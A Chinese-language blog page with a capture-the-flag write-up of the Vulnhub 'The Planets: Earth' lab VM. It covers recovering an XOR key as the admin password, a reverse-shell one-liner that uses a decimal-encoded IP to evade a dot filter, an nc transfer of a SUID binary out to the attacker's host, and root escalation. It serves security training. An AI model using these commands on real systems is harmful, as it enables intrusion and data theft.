@@ -1,0 +1,244 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>The Planets: Earth | cooorgi</title><meta name="author" content="cooorgi"><meta name="copyright" content="cooorgi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Vulnhub刷题记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Planets: Earth">
+<meta property="og:url" content="https://www.cooorgi.top/articles/5b85ed80.html">
+<meta property="og:site_name" content="cooorgi">
+<meta property="og:description" content="Vulnhub刷题记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.cooorgi.top/upload/background.jpg">
+<meta property="article:published_time" content="2025-05-02T06:59:23.000Z">
+<meta property="article:modified_time" content="2025-05-02T07:16:08.479Z">
+<meta property="article:author" content="cooorgi">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.cooorgi.top/upload/background.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.cooorgi.top/articles/5b85ed80.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        if (name && globalFn[key][name]) return
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+          
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":3,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'The Planets: Earth',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-05-02 15:16:08'
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/firacode@6.2.0/distr/fira_code.css"><link rel="stylesheet" href="/css/abb.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/upload/background.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/upload/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">cooorgi</span></a><a class="nav-page-title" href="/"><span class="site-name">The Planets: Earth</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">The Planets: Earth</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-02T06:59:23.000Z" title="发表于 2025-05-02 14:59:23">2025-05-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-02T07:16:08.479Z" title="更新于 2025-05-02 15:16:08">2025-05-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">837</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="The-Planets-Earth"><a href="#The-Planets-Earth" class="headerlink" title="The Planets: Earth"></a>The Planets: Earth</h2><blockquote>
+<p><a href="https://download.vulnhub.com/theplanets/Earth.ova" rel="external nofollow noreferrer">靶机下载地址</a></p>
+</blockquote>
+<p>探测出来 IP 是 <code>192.168.234.144</code> 起了一个 http 和 https</p>
+<p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250502151031661.png" alt="image-20250502151031661"></p>
+<p>扫出来两个域名：<code>earth.local</code>、<code>terratest.earth.local</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250502151037923.png" alt="image-20250502151037923"></p>
+<p>改一下配置文件，Windows 的是 <code>C:\Windows\System32\drivers\etc\hosts</code>，Linux 的是 <code>/etc/hosts</code>。</p>
+<p>注意，如果挂了梯子的，如果打不开<code>https://earth.local/</code>可能需要关闭梯子或者是改一下 DNS</p>
+<p>扫出来几个目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://earth.local/admin/</span><br><span class="line">https://earth.local/admin/login</span><br><span class="line">https://terratest.earth.local/index.html</span><br><span class="line">https://terratest.earth.local/robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>先看 <code>robots.txt</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250502151055101.png" alt="image-20250502151055101"></p>
+<p>有一个和其他不一样的东西 <code>Disallow: /testingnotes.*</code> 根据名称盲猜后缀是 txt ，访问一下试试，给了一些提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br><span class="line"></span><br><span class="line">安全消息系统测试笔记：  </span><br><span class="line">* 使用异或加密算法，应与 RSA 中使用的算法一样安全。  </span><br><span class="line">* 地球已确认收到我们发送的消息。  </span><br><span class="line">* 使用 testdata.txt 文件测试加密。  </span><br><span class="line">* terra 作为管理员门户的用户名。  </span><br><span class="line">待办事项：  </span><br><span class="line">* 我们如何安全地向地球发送每月密钥？还是应该每周更换密钥？  </span><br><span class="line">* 需要测试不同密钥长度以防范暴力破解。密钥应该多长？  </span><br><span class="line">* 需要改进消息界面和管理员面板的界面，目前非常基础。</span><br></pre></td></tr></table></figure>
+
+<p>那就看看 <code>testdata.txt</code> 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>
+
+<p>没有什么新东西了，看看另一个域名，首页有一个先前发送的消息，看看能不能解密一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Previous Messages:</span><br><span class="line"></span><br><span class="line">- 37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line">- 3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line">- 2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure>
+
+<p>前两个 xor 出来都是乱的，只有最后一个是正常的，是 <code>earthclimatechangebad4humans</code> 的重复，猜测可能是密钥</p>
+<p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250429222923.png"></p>
+<p><code>terra/earthclimatechangebad4humans</code> 成功登录进管理员界面，是一个 cmd 命令执行框，用户是 apache 用户，连登录权限都没有，试试反弹 shell，过滤点号，点分转一手十进制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/3232295553/9099 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>/var/earth_web</code> 目录下找到一个 <code>user_flag.txt</code> 拿到第一个 flag</p>
+<blockquote>
+<p><code>[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]</code></p>
+</blockquote>
+<p>然后信息搜集为提权做准备</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -writable -<span class="built_in">type</span> d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250430002726.png"></p>
+<p>找出来一个奇怪的程序，应该是准备好可以用来提权的，但是执行失败了，nc 传出来分析一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nc 传文件</span></span><br><span class="line">nc 192.168.234.129 9098 &lt; /usr/bin/reset_root <span class="comment"># 受控端</span></span><br><span class="line">nc -lp 9098 &gt; reset_root <span class="comment"># vps</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分析程序0.</span></span><br><span class="line">strace -f -F ./reset_root <span class="comment"># -f和-F表示同时跟踪fork和vfork出来的进程</span></span><br><span class="line">ltrace ./reset_root <span class="comment"># 用来跟踪进程调用库函数的情况</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250502151111401.png" alt="image-20250502151111401"></p>
+<p>主要是这三个触发器分别检测 <code>/dev/shm/kHgTFI5G</code>、<code>/dev/shm/Zw7bV9U5</code>、<code>/tmp/kcM0Wewe</code> 这三个文件或者目录是否存在，不存在就不执行，存在就继续执行。那就创建一下，然后再执行。成功拿到密码并提权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250430003509.png"></p>
+<p>然后在 root 目录下拿到第二个 flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250502151117586.png" alt="image-20250502151117586"></p>
+<blockquote>
+<p><code>[root_flag_b0da9554d29db2117b02aa8b66ec492e]</code></p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.cooorgi.top">cooorgi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.cooorgi.top/articles/5b85ed80.html">https://www.cooorgi.top/articles/5b85ed80.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://www.cooorgi.top" target="_blank">cooorgi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnhub/">Vulnhub</a></div><div class="post-share"><div class="social-share" data-image="/upload/background.jpg" data-sites="wechat,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="next-post pull-full" href="/articles/37df81e9.html" title="Empire: Breakout"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Empire: Breakout</div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a href="/articles/37df81e9.html" title="Empire: Breakout"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-01</div><div class="title">Empire: Breakout</div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info is-center"><div class="avatar-img"><img src="/upload/background.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cooorgi</div><div class="author-info-description">cooorgi小栈</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" href="https://github.com/cooorgi"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/cooorgi" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:cooorgi@126.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Planets-Earth"><span class="toc-number">1.</span> <span class="toc-text">The Planets: Earth</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/articles/5b85ed80.html" title="The Planets: Earth">The Planets: Earth</a><time datetime="2025-05-02T06:59:23.000Z" title="发表于 2025-05-02 14:59:23">2025-05-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/articles/37df81e9.html" title="Empire: Breakout">Empire: Breakout</a><time datetime="2025-05-01T07:34:16.000Z" title="发表于 2025-05-01 15:34:16">2025-05-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/articles/3448e522.html" title="春秋杯 冬季赛">春秋杯 冬季赛</a><time datetime="2025-01-17T14:24:25.000Z" title="发表于 2025-01-17 22:24:25">2025-01-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/articles/5e70877f.html" title="终端美化">终端美化</a><time datetime="2024-11-20T02:24:41.000Z" title="发表于 2024-11-20 10:24:41">2024-11-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/articles/90ee655.html" title="ctfshow misc入门">ctfshow misc入门</a><time datetime="2024-10-21T12:30:02.000Z" title="发表于 2024-10-21 20:30:02">2024-10-21</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/upload/background.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025  By cooorgi</div><div class="framework-info"><span>框架 </span><a href="https://hexo.io" rel="external nofollow noreferrer">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi,  welcome  to  my  <a href="https://cooorgi.github.io/">  blog</a>!</div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ND6GDDXWX0J3CotuYRmkJKgw-MdYXbMMI',
+      appKey: 'W4JzBOuNhQ7LHtcuOErw5QPQ',
+      avatar: 'monsterid',
+      serverURLs: 'https://nd6gddxw.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !true) {
+    if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script src="https://cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
